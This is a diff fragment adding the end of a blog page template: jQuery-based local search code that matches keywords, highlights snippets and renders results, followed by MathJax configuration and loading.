+            var isMatch = false;
+            var hitCount = 0;
+            var searchTextCount = 0;
+            var title = data.title
+              ? data.title.trim()
+              : '';
+            var titleInLowerCase = title.toLowerCase();
+            var content = data.content
+              ? data.content.trim().replace(/<[^>]+>/g, "")
+              : '';
+            var contentInLowerCase = content.toLowerCase();
+            var articleUrl = decodeURIComponent(data.url);
+
+            var date = data.date;
+            var dateTime = date.replace(/T/, " ").replace(/.000Z/, "");
+            var imgUrl = data.header_img;
+            
+
+
+            var indexOfTitle = [];
+            var indexOfContent = [];
+            // only match articles with not empty titles
+            keywords.forEach(function (keyword) {
+              function getIndexByWord(word, text, caseSensitive) {
+                var wordLen = word.length;
+                if (wordLen === 0) {
+                  return [];
+                }
+                var startPosition = 0,
+                  position = [],
+                  index = [];
+                if (!caseSensitive) {
+                  text = text.toLowerCase();
+                  word = word.toLowerCase();
+                }
+                while ((position = text.indexOf(word, startPosition)) > -1) {
+                  index.push({position: position, word: word});
+                  startPosition = position + wordLen;
+                }
+                return index;
+              }
+              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+            });
+            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+              isMatch = true;
+              hitCount = indexOfTitle.length + indexOfContent.length;
+            }
+            // show search results
+            if (isMatch) {
+              // sort index by position of keyword
+              [indexOfTitle, indexOfContent].forEach(function (index) {
+                index.sort(function (itemLeft, itemRight) {
+                  if (itemRight.position !== itemLeft.position) {
+                    return itemRight.position - itemLeft.position;
+                  } else {
+                    return itemLeft.word.length - itemRight.word.length;
+                  }
+                });
+              });
+              // merge hits into slices
+              function mergeIntoSlice(text, start, end, index) {
+                var item = index[index.length - 1];
+                var position = item.position;
+                var word = item.word;
+                var hits = [];
+                var searchTextCountInSlice = 0;
+                while (position + word.length <= end && index.length != 0) {
+                  if (word === searchText) {
+                    searchTextCountInSlice++;
+                  }
+                  hits.push({position: position, length: word.length});
+                  var wordEnd = position + word.length;
+                  // move to next position of hit
+                  index.pop();
+                  while (index.length != 0) {
+                    item = index[index.length - 1];
+                    position = item.position;
+                    word = item.word;
+                    if (wordEnd > position) {
+                      index.pop();
+                    } else {
+                      break;
+                    }
+                  }
+                }
+                searchTextCount += searchTextCountInSlice;
+                return {hits: hits, start: start, end: end, searchTextCount: searchTextCountInSlice};
+              }
+              var slicesOfTitle = [];
+              if (indexOfTitle.length != 0) {
+                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+              }
+              var slicesOfContent = [];
+              while (indexOfContent.length != 0) {
+                var item = indexOfContent[indexOfContent.length - 1];
+                var position = item.position;
+                var word = item.word;
+                // cut out 100 characters
+                var start = position - 20;
+                var end = position + 80;
+                if (start < 0) {
+                  start = 0;
+                }
+                if (end < position + word.length) {
+                  end = position + word.length;
+                }
+                if (end > content.length) {
+                  end = content.length;
+                }
+                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+              }
+              // sort slices in content by search text's count and hits' count
+              slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                  return sliceRight.hits.length - sliceLeft.hits.length;
+                } else {
+                  return sliceLeft.start - sliceRight.start;
+                }
+              });
+              // select top N slices in content
+              var upperBound = parseInt('1');
+              if (upperBound >= 0) {
+                slicesOfContent = slicesOfContent.slice(0, upperBound);
+              }
+              // highlight title and content
+              function highlightKeyword(text, slice) {
+                var result = '';
+                var prevEnd = slice.start;
+                slice.hits.forEach(function (hit) {
+                  result += text.substring(prevEnd, hit.position);
+                  var end = hit.position + hit.length;
+                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                  prevEnd = end;
+                });
+                result += text.substring(prevEnd, slice.end);
+                return result;
+              }
+              var resultItem = '';
+
+              // if (slicesOfTitle.length != 0) {   resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>"; } else {   resultItem += "<li><a target='_blank' href='" +
+              // articleUrl + "' class='search-result-title'>" + title + "</a>"; } slicesOfContent.forEach(function (slice) {   resultItem += "<a target='_blank' href='" + articleUrl + "'><p class=\"search-result\">" + highlightKeyword(content, slice) +
+              // "...</p></a>"; }); resultItem += "</li>";
+
+              if (slicesOfTitle.length != 0) {
+                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</div><time class='search-result-date'>" + dateTime + "</time>";
+              } else {
+                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + title + "</div><time class='search-result-date'>" + dateTime + "</time>";
+              }
+              slicesOfContent.forEach(function (slice) {
+                resultItem += "<p class=\"search-result-content\">" + highlightKeyword(content, slice) + "...</p>";
+              });
+              resultItem += "</div><div class='search-result-right'><img class='media-image' src='" + imgUrl + "' width='64px' height='48px'></img></div></a>";
+
+              resultItems.push({item: resultItem, searchTextCount: searchTextCount, hitCount: hitCount, id: resultItems.length});
+            }
+          })
+        };
+
+        if (keywords.length === 1 && keywords[0] === "") {
+          resultContent.innerHTML = '<div id="no-result"></div>'
+        } else if (resultItems.length === 0) {
+          resultContent.innerHTML = '<div id="no-result"></div>'
+        } else {
+          resultItems.sort(function (resultLeft, resultRight) {
+            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+              return resultRight.searchTextCount - resultLeft.searchTextCount;
+            } else if (resultLeft.hitCount !== resultRight.hitCount) {
+              return resultRight.hitCount - resultLeft.hitCount;
+            } else {
+              return resultRight.id - resultLeft.id;
+            }
+          });
+          var searchResultList = '<div class=\"search-result-list\">';
+          resultItems.forEach(function (result) {
+            searchResultList += result.item;
+          })
+          searchResultList += "</div>";
+          resultContent.innerHTML = searchResultList;
+        }
+      }
+      if ('auto' === 'auto') {
+        input.addEventListener('input', inputEventFunction);
+      } else {
+        $('.search-icon').click(inputEventFunction);
+        input.addEventListener('keypress', function (event) {
+          if (event.keyCode === 13) {
+            inputEventFunction();
+          }
+        });
+      }
+      // remove loading animation
+      $('body').css('overflow', '');
+      proceedsearch();
+    }
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function (e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc('local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function (e) {
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 && $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+
+    document.addEventListener('mouseup', (e) => {
+      var _con = document.querySelector(".local-search-content");
+      if (_con) {
+        if (!_con.contains(e.target)) {
+          onPopupClose();
+        }
+      }
+    });
+  </script>
+
+
+		
+	<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
